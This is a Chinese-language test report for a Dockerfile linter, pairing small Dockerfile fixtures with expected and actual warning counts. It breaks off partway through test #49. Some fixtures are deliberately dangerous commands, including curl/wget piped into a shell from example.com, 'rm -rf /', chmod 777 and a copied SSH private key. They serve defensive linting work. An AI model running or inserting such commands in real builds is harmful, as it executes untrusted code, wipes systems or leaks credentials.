# Dockerfile Linter 全面集成测试报告

**生成时间**: 2026-03-31
**测试案例数**: 100

---

## 测试 #1: F001: 缺少 FROM 指令

**类别**: FROM

### Dockerfile 代码

```dockerfile
# 缺少 FROM
WORKDIR /app
RUN npm install
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #2: F002: FROM 位置错误 - WORKDIR 在 FROM 之前

**类别**: FROM

### Dockerfile 代码

```dockerfile
WORKDIR /app
FROM node:18-alpine
COPY . .
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 0 |
| 信息 (info) | 3 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 3 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #3: F002: FROM 位置正确 - ARG 在 FROM 之前允许

**类别**: FROM

### Dockerfile 代码

```dockerfile
ARG BASE_IMAGE=node:18-alpine
FROM ${BASE_IMAGE}
WORKDIR /app
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #4: F003: FROM 缺少镜像名

**类别**: FROM

### Dockerfile 代码

```dockerfile
FROM
WORKDIR /app
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #5: F004: 使用 latest 标签

**类别**: FROM

### Dockerfile 代码

```dockerfile
FROM node:latest
WORKDIR /app
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #6: F004: 无标签默认 latest

**类别**: FROM

### Dockerfile 代码

```dockerfile
FROM ubuntu
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #7: F004: 使用 digest 无 latest 警告

**类别**: FROM

### Dockerfile 代码

```dockerfile
FROM node@sha256:abc123
WORKDIR /app
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #8: F005: 镜像名使用变量

**类别**: FROM

### Dockerfile 代码

```dockerfile
ARG BASE_IMAGE
FROM ${BASE_IMAGE}
WORKDIR /app
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #9: F006: stage 别名重复

**类别**: FROM

### Dockerfile 代码

```dockerfile
FROM node:18-alpine AS builder
WORKDIR /app

FROM alpine:3.18 AS builder
COPY --from=builder /app /app
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 2 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 2 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #10: FROM: 正确的多阶段构建

**类别**: FROM

### Dockerfile 代码

```dockerfile
FROM node:18-alpine AS builder
WORKDIR /app
RUN npm install

FROM node:18-alpine AS runner
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
USER node
CMD ["node", "server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #11: C001: CMD JSON 数组使用单引号

**类别**: CMD

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
CMD ['node', 'server.js']
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 1 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #12: C001: ENTRYPOINT JSON 数组使用单引号

**类别**: ENTRYPOINT

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ENTRYPOINT ['node', 'server.js']
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 1 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #13: C002: CMD JSON 数组括号不匹配

**类别**: CMD

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
CMD ["node", "server.js"
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 1 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #14: C002: CMD JSON 数组双引号不匹配

**类别**: CMD

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
CMD ["node", "server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #15: C003: CMD 使用 shell 格式

**类别**: CMD

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
CMD node server.js
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #16: C003: ENTRYPOINT 使用 shell 格式

**类别**: ENTRYPOINT

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ENTRYPOINT node server.js
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #17: C004: 多个 CMD 指令

**类别**: CMD

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
CMD ["node", "server.js"]
CMD ["npm", "start"]
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 3 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 3 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #18: C004: 多个 ENTRYPOINT 指令

**类别**: ENTRYPOINT

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ENTRYPOINT ["node"]
ENTRYPOINT ["bash"]
CMD ["server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #19: C006: CMD + ENTRYPOINT 组合语义错误

**类别**: CMD+ENTRYPOINT

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ENTRYPOINT ["node"]
CMD ["npm", "start"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #20: C006: CMD + ENTRYPOINT 正确组合

**类别**: CMD+ENTRYPOINT

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ENTRYPOINT ["node"]
CMD ["server.js"]
USER node
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 0 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #21: C007: ENTRYPOINT shell form + CMD exec form

**类别**: CMD+ENTRYPOINT

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ENTRYPOINT node server.js
CMD ["--port", "3000"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 3 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 3 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #22: CP001: COPY 缺少路径参数

**类别**: COPY

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
COPY .
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 0 |
| 信息 (info) | 2 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 2 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #23: CP001: ADD 缺少路径参数

**类别**: ADD

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ADD package.json
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #24: CP002: ADD 远程 URL

**类别**: ADD

### Dockerfile 代码

```dockerfile
FROM ubuntu:20.04
ADD https://example.com/file.tar.gz /tmp/
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #25: CP003: COPY --from 引用不存在的阶段

**类别**: COPY

### Dockerfile 代码

```dockerfile
FROM ubuntu:22.04
COPY --from=builder /app/main /main
CMD ["/main"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #26: CP003: COPY --from 自引用错误

**类别**: COPY

### Dockerfile 代码

```dockerfile
FROM node:18-alpine AS builder
WORKDIR /app
COPY --from=builder /app . .
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #27: CP003: COPY --from 引用外部镜像（info）

**类别**: COPY

### Dockerfile 代码

```dockerfile
FROM alpine:3.18
COPY --from=node:18-alpine /usr/local/bin/node /usr/local/bin/
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #28: CP004: 复制敏感文件 .env

**类别**: COPY

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
COPY .env /app/.env
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #29: CP004: 复制敏感文件 id_rsa

**类别**: COPY

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
COPY id_rsa /root/.ssh/id_rsa
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 1 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 1 | ✅ |

**状态**: ✅ 通过

---

## 测试 #30: CP005: COPY . . 过宽复制

**类别**: COPY

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
COPY . .
RUN npm install
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 3 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 3 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #31: CP006: USER 后 COPY 缺少 --chown

**类别**: COPY

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
WORKDIR /app
USER node
COPY . .
CMD ["node", "server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 0 |
| 信息 (info) | 4 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 4 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #32: CP006: COPY 使用 --chown 正确

**类别**: COPY

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
WORKDIR /app
COPY --chown=node:node . .
USER node
CMD ["node", "server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 0 |
| 信息 (info) | 3 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 3 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #33: R001: curl | bash 远程管道执行

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM alpine:3.18
RUN curl -sSL https://example.com/install.sh | bash
CMD ["sh"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #34: R001: wget | sh 远程管道执行

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM alpine:3.18
RUN wget -qO- https://example.com/install.sh | sh
CMD ["sh"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #35: R002: sudo 使用

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM ubuntu:20.04
RUN apt-get update && sudo apt-get install -y curl
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #36: R003: apt-get update 单独运行

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM ubuntu:20.04
RUN apt-get update
RUN apt-get install curl
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 3 |
| 信息 (info) | 2 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 3 | ✅ |
| 信息 (info) | 2 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #37: R003: apt-get update 和 install 合并正确

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #38: R004: apt-get install 未清理缓存

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y curl
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #39: R005: apt-get install 缺少 -y

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM ubuntu:20.04
RUN apt-get update && apt-get install curl
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #40: R006: apk add 缺少 --no-cache

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM alpine:3.18
RUN apk add curl
CMD ["sh"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #41: R006: apk add 使用 --no-cache 正确

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM alpine:3.18
RUN apk add --no-cache curl
CMD ["curl"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #42: R007: rm -rf / 危险删除

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM alpine:3.18
RUN rm -rf /
CMD ["sh"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #43: R007: rm -rf /* 危险删除

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM alpine:3.18
RUN rm -rf /*
CMD ["sh"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #44: R008: chmod 777 权限过宽

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM alpine:3.18
RUN chmod 777 /app
CMD ["sh"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #45: R009: cd 命令应使用 WORKDIR

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
RUN cd /app && npm install
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #46: R010: yum install 缺少 -y

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM centos:7
RUN yum install curl
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #47: R011: yum install 未清理缓存

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM centos:7
RUN yum install -y curl
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #48: R012: dnf install 缺少 -y

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM fedora:38
RUN dnf install curl
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #49: E001: ENV 包含 API_KEY

**类别**: ENV

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ENV API_KEY=abc123secret
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 1 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
